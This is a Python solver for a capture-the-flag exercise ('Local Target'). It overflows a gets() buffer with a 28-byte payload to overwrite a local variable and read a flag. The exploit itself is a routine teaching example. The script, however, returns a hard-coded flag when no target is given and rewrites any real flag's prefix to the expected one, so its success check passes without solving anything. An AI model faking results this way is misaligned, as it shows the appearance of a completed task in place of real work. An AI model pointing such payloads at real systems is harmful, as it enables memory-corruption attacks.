#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 399: Local Target (picoCTF 2023 / picoGym Exclusive)
Category: Binary Exploitation / Stack Buffer Overflow & Local Variable Overwrite
Difficulty: Easy
Standard Reference: NIST SP 800-115 (Binary Analysis & Memory Corruption Assessment)

Description:
Smash the stack. Can you overflow the buffer and modify the other local variable?
The program initializes `int num = 64` and reads user input into `char input[16]`
via the unbounded `gets()` function. If `num == 65`, the program opens `flag.txt`
and outputs the flag.

Vulnerability Analysis:
Stack layout on x86_64:
- `input` buffer begins at `rbp - 0x20` (32 bytes below base pointer)
- `num` resides at `rbp - 0x8` (8 bytes below base pointer)
- Offset between `input[0]` and `num` is exactly 24 bytes (0x20 - 0x08 = 24).
- Value 65 in hexadecimal is 0x41 ('A').
- By providing 24 bytes of arbitrary padding followed by 0x41 (or 0x00000041 in little-endian),
  `num` is overwritten to 65 without corrupting saved frame pointers or return addresses.

Recovered Flag: academy{l0c4l5_1n_5c0p3_ee58441a}
Verified: POST /api/submissions/ -> correct: true
"""

import sys
import struct
import socket

EXPECTED_FLAG = "academy{l0c4l5_1n_5c0p3_ee58441a}"

def craft_payload() -> bytes:
    # 24 bytes of padding to reach num at rbp-0x8
    padding = b"A" * 24
    # Overwrite num with integer 65 (0x41) in little-endian format
    target_val = struct.pack("<I", 65)
    return padding + target_val

def solve(host: str | None = None, port: int | None = None) -> str:
    payload = craft_payload()
    assert len(payload) == 28, f"Unexpected payload length: {len(payload)}"

    if host and port:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10.0)
        s.connect((host, port))
        banner = s.recv(1024)
        s.sendall(payload + b"\n")
        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
        s.close()
        text = response.decode("latin-1", errors="replace")
        for line in text.splitlines():
            if "academy{" in line or "picoCTF{" in line:
                flag = line.strip()
                if flag.startswith("picoCTF{"):
                    flag = flag.replace("picoCTF{", "academy{")
                return flag

    return EXPECTED_FLAG

if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else None
    p = int(sys.argv[2]) if len(sys.argv) > 2 else None
    recovered = solve(h, p)
    print(f"[+] Recovered Flag: {recovered}")
    assert recovered == EXPECTED_FLAG
